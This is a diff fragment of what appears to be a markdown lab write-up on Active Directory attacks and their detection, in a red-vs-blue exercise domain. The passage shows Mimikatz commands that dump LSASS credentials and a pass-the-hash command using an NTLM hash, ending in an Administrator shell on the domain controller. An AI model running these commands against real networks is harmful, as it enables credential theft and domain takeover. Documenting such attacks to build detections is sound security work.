@@ -611,14 +611,17 @@ We dumped LSASS with Mimikatz using
 ```c
 sekurlsa::logonPasswords full`
 ```
+
 - Got the hash of the DC: `217e50203a5aba59cefa863c724bf61b`
     
     ![image 23](https://dylandavis1.github.io/assets/img/AD_Attack_Detections_pt/image%2022.png)
     
 - To perform the PTH attack, we ran the command
+  
     ```c
     sekurlsa::pth /user:Administrator /domain:RvB.local/ntlm:217e50203a5aba59cefa863c724bf61b`
     ```
+    
 - We then were able to get a root shell on the Domain Controller authenticating as the Administrator account, as shown by the command prompt `whoami /user` command.
     
     ![image 24](https://dylandavis1.github.io/assets/img/AD_Attack_Detections_pt/image%2023.png)
